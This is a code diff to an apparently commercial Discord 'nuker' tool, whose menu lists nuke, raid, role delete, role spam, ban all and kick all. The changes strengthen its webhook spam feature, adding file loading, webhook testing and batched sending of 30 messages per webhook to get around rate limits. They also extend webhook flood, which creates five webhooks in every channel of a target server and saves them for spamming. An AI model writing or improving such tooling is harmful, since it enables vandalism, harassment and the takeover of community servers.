@@ -773,19 +773,20 @@ def validate_license_key(save_license_prompt=False):
 
 def display_nuking_menu():
     display_ascii_art()
+    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Nuking Menu{Style.RESET_ALL}")
     print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}\n")
 
-    # Format options in pairs - ALL WHITE TEXT
+    # Format options in pairs - ALL WHITE TEXT, PROPERLY CENTERED
     rows = [
-        (f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Fast nuke",
+        (f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Fast nuke", 
          f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Nuke"),
-        (f"{get_color('light')}[3]{Style.RESET_ALL}{Fore.WHITE} Raid",
+        (f"{get_color('light')}[3]{Style.RESET_ALL}{Fore.WHITE} Raid", 
          f"{get_color('light')}[4]{Style.RESET_ALL}{Fore.WHITE} Webhook spam"),
-        (f"{get_color('light')}[5]{Style.RESET_ALL}{Fore.WHITE} Webhook flood",
+        (f"{get_color('light')}[5]{Style.RESET_ALL}{Fore.WHITE} Webhook flood", 
          f"{get_color('light')}[6]{Style.RESET_ALL}{Fore.WHITE} Role delete"),
-        (f"{get_color('light')}[7]{Style.RESET_ALL}{Fore.WHITE} Role spam",
+        (f"{get_color('light')}[7]{Style.RESET_ALL}{Fore.WHITE} Role spam", 
          f"{get_color('light')}[8]{Style.RESET_ALL}{Fore.WHITE} Ban all"),
-        (f"{get_color('light')}[9]{Style.RESET_ALL}{Fore.WHITE} Kick all",
+        (f"{get_color('light')}[9]{Style.RESET_ALL}{Fore.WHITE} Kick all", 
          f"{get_color('light')}[0]{Style.RESET_ALL}{Fore.WHITE} ← Back")
     ]
 
@@ -1117,9 +1118,40 @@ async def raid(bot):
 
 async def webhook_spam(_):
     print(f"{Fore.YELLOW}[INFO] Starting Webhook Spam...{Style.RESET_ALL}")
+    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")
     
-    urls_input = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook URLs (comma separated) > ")
-    urls = [url.strip() for url in urls_input.split(',') if url.strip()]
+    # Option to load from file or manual input
+    print(f"\n{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Load webhooks from webhooks.txt")
+    print(f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Enter webhooks manually")
+    
+    choice = input(f"\n{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Select option > ").strip()
+    
+    urls = []
+    
+    if choice == "1":
+        # Load from file
+        try:
+            if os.path.exists("webhooks.txt"):
+                with open("webhooks.txt", "r", encoding="utf-8") as f:
+                    content = f.read()
+                    # Split by commas or newlines
+                    urls = [url.strip() for url in content.replace(',', '\n').split('\n') if url.strip()]
+                print(f"{Fore.GREEN}[SUCCESS] Loaded {len(urls)} webhooks from webhooks.txt{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}[ERROR] webhooks.txt not found!{Style.RESET_ALL}")
+                return
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] Failed to load webhooks: {e}{Style.RESET_ALL}")
+            return
+    else:
+        # Manual input
+        urls_input = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook URLs (comma or newline separated) > ")
+        urls = [url.strip() for url in urls_input.replace(',', '\n').split('\n') if url.strip()]
+    
+    if not urls:
+        print(f"{Fore.RED}[ERROR] No webhook URLs provided!{Style.RESET_ALL}")
+        return
+    
     msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Message > ")
     
     print(f"{Fore.YELLOW}[INFO] Found {len(urls)} webhook URLs{Style.RESET_ALL}")
@@ -1130,7 +1162,15 @@ async def webhook_spam(_):
             try:
                 wh = discord.Webhook.from_url(url, session=session)
                 
-                # Add spam tasks
+                # Test the webhook
+                try:
+                    await wh.send("Test message", wait=True)
+                    print(f"{Fore.GREEN}[WEBHOOK] Webhook {url_idx+1} is valid{Style.RESET_ALL}")
+                except:
+                    print(f"{Fore.RED}[ERROR] Webhook {url_idx+1} failed test{Style.RESET_ALL}")
+                    continue
+                
+                # Add spam tasks - 30 messages per webhook
                 for msg_idx in range(30):
                     tasks.append(wh.send(msg, wait=False))
                 
@@ -1140,18 +1180,23 @@ async def webhook_spam(_):
         if tasks:
             print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} webhook messages...{Style.RESET_ALL}")
             
-            # Send in batches
+            # Send in batches to avoid rate limits
             batch_size = 50
+            total_sent = 0
+            
             for i in range(0, len(tasks), batch_size):
                 batch = tasks[i:i+batch_size]
-                print(f"{Fore.CYAN}[WEBHOOK] Sending batch {i//batch_size + 1}...{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[WEBHOOK] Sending batch {i//batch_size + 1} ({len(batch)} messages)...{Style.RESET_ALL}")
                 
                 try:
-                    await asyncio.gather(*batch, return_exceptions=True)
+                    results = await asyncio.gather(*batch, return_exceptions=True)
+                    batch_success = sum(1 for r in results if not isinstance(r, Exception))
+                    total_sent += batch_success
+                    print(f"{Fore.GREEN}[WEBHOOK] Batch {i//batch_size + 1}: Sent {batch_success} messages{Style.RESET_ALL}")
                 except Exception as e:
-                    print(f"{Fore.RED}[ERROR] Batch failed: {e}{Style.RESET_ALL}")
+                    print(f"{Fore.RED}[ERROR] Batch {i//batch_size + 1} failed: {e}{Style.RESET_ALL}")
             
-            print(f"{Fore.GREEN}[SUCCESS] Webhook spam completed!{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[SUCCESS] Webhook spam completed! Sent {total_sent} messages{Style.RESET_ALL}")
         else:
             print(f"{Fore.YELLOW}[INFO] No valid webhooks found{Style.RESET_ALL}")
 
@@ -1192,39 +1237,52 @@ async def webhook_flood(bot):
     print(f"{Fore.YELLOW}[INFO] Found {len(text_channels)} text channels with webhook permissions{Style.RESET_ALL}")
     
     if not text_channels:
-        print(f"{Fore.RED}[ERROR] No channels with webhook creation permissions!{Style.RESET_ALL}")
+        print(f"{Fore.RED}[ERROR] No channels with webhook creation permissions found!{Style.RESET_ALL}")
         return
     
     urls = []
     tasks = []
-    for ch_idx, ch in enumerate(text_channels[:10]):
-        try:
-            # Create 2 webhooks per channel
-            tasks.append(ch.create_webhook(name=f"{name}-{ch_idx}"))
-        except Exception as e:
-            print(f"{Fore.RED}[ERROR] Failed to queue webhook creation in #{ch.name}: {e}{Style.RESET_ALL}")
     
-    print(f"{Fore.YELLOW}[INFO] Creating {len(tasks)} webhooks...{Style.RESET_ALL}")
+    # Create 5 webhooks per channel
+    for ch_idx, ch in enumerate(text_channels):
+        for wh_idx in range(5):  # 5 webhooks per channel
+            webhook_name = f"{name}-{ch_idx+1}-{wh_idx+1}"
+            tasks.append(ch.create_webhook(name=webhook_name))
+    
+    print(f"{Fore.YELLOW}[INFO] Creating {len(tasks)} webhooks (5 per channel)...{Style.RESET_ALL}")
     
     if tasks:
-        try:
-            results = await asyncio.gather(*tasks, return_exceptions=True)
+        # Create webhooks in batches
+        batch_size = 10
+        created_count = 0
+        
+        for i in range(0, len(tasks), batch_size):
+            batch = tasks[i:i+batch_size]
+            print(f"{Fore.CYAN}[WEBHOOK] Creating batch {i//batch_size + 1} ({len(batch)} webhooks)...{Style.RESET_ALL}")
             
-            for i, result in enumerate(results):
-                if isinstance(result, discord.Webhook):
-                    urls.append(result.url)
-                    print(f"{Fore.GREEN}[WEBHOOK] Created webhook: {result.name}{Style.RESET_ALL}")
-                else:
-                    print(f"{Fore.RED}[ERROR] Failed to create webhook {i+1}: {result}{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.RED}[ERROR] Failed to create webhooks: {e}{Style.RESET_ALL}")
+            try:
+                results = await asyncio.gather(*batch, return_exceptions=True)
+                
+                for j, result in enumerate(results):
+                    if isinstance(result, discord.Webhook):
+                        urls.append(result.url)
+                        created_count += 1
+                        if created_count <= 10 or created_count % 10 == 0:
+                            print(f"{Fore.GREEN}[WEBHOOK] Created webhook: {result.name}{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.RED}[ERROR] Failed to create webhook: {result}{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[ERROR] Batch {i//batch_size + 1} failed: {e}{Style.RESET_ALL}")
     
     # Save webhooks to file
     if urls:
         try:
+            # Create comma-separated string
+            urls_text = ",".join(urls)
             with open("webhooks.txt", "w", encoding="utf-8") as f:
-                f.write("\n".join(urls))
-            print(f"{Fore.GREEN}[SUCCESS] Saved {len(urls)} webhooks to webhooks.txt{Style.RESET_ALL}")
+                f.write(urls_text)
+            print(f"{Fore.GREEN}[SUCCESS] Saved {len(urls)} webhooks to webhooks.txt (comma-separated){Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[INFO] You can use these webhooks with 'Webhook spam' option{Style.RESET_ALL}")
         except Exception as e:
             print(f"{Fore.RED}[ERROR] Failed to save webhooks: {e}{Style.RESET_ALL}")
     else:
@@ -1510,7 +1568,7 @@ def main():
                     input(f"\n{Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
                     continue
 
-                # Get bot token
+                # Get bot token for other options
                 token = input(f"\n{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Bot Token > ").strip()
                 if not token: 
                     print(f"{Fore.RED}[ERROR] No token provided!{Style.RESET_ALL}")
@@ -1521,7 +1579,7 @@ def main():
                     "1": fast_nuke,
                     "2": nuke,
                     "3": raid,
-                    "5": webhook_flood,
+                    "5": webhook_flood,  # Now this will ask for bot token and server ID
                     "6": role_delete,
                     "7": role_spam,
                     "8": ban_all,
